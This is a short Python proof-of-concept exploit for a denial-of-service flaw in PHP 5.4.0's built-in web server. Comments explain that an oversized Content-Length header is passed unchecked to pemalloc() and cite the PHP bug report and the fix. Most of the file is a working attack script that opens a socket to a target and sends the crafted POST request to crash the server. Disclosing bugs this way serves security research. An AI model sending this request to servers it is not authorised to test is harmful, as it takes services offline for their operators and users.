#!/usr/bin/python

# Title:      PHP 5.4.0 Built-in Web Server DoS PoC
# Date:       16 March 2012
# Author:     ls (contact@kaankivilcim.com)
# Reference:  https://bugs.php.net/bug.php?id=61461
# Comments:   Fixed in PHP 5.4.1RC1-DEV and 5.5.0-DEV

# The value of the Content-Length header is passed directly to a pemalloc() call in sapi/cli/php_cli_server.c
# on line 1538. The inline function defined within Zend/zend_alloc.h for malloc() will fail, and will terminate
# the process with the error message "Out of memory".
#
# 1537 if (!client->request.content) {
# 1538   client->request.content = pemalloc(parser->content_length, 1);
# 1539   client->request.content_len = 0;
# 1540 }
#
# PHP 5.4.0 Development Server started at Tue Mar 13 19:41:45 2012
# Listening on 127.0.0.1:80
# Document root is /tmp
# Press Ctrl-C to quit.
# Out of memory

import socket, sys

target = "127.0.0.1"
port   = 80;

request  = "POST / HTTP/1.1\n"
request += "Content-Type: application/x-www-form-urlencoded\n"
request += "Content-Length: 2147483638\n\n" # <-- Choose size larger than the available memory on target
request += "A=B\n\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((target, port))
except:
  print "[-] Connection to %s:%s failed!" % (target, port)
  sys.exit(0)

print "[+] Sending HTTP request. Check for crash on target."

s.send(request)
s.close()